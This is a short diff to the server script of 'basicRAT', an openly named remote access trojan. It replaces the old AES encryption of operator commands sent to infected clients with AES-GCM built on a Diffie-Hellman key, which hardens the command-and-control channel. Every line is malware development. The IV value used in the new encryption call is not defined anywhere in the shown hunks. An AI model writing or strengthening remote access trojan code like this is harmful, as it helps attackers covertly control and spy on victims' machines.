@@ -16,7 +16,7 @@ import time
 from core import common
 from core import crypto
 from core import filesock
-
+from core import aes_gcm
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -76,6 +76,7 @@ def main():
     conn, addr = s.accept()
 
     DHKEY = crypto.diffiehellman(conn, server=True)
+    GCM = aes_gcm.AES_GCM(DHKEY)
 
     while True:
         prompt = raw_input('\n[{}] basicRAT> '.format(addr[0])).rstrip()
@@ -98,7 +99,8 @@ def main():
             continue
 
         # send data to client
-        conn.send(crypto.AES_encrypt(prompt, DHKEY))
+        ciphertext, tag = GCM.encrypt(IV, prompt)
+        conn.send(IV+tag+ciphertext)
 
         # stop server
         if cmd == 'quit':
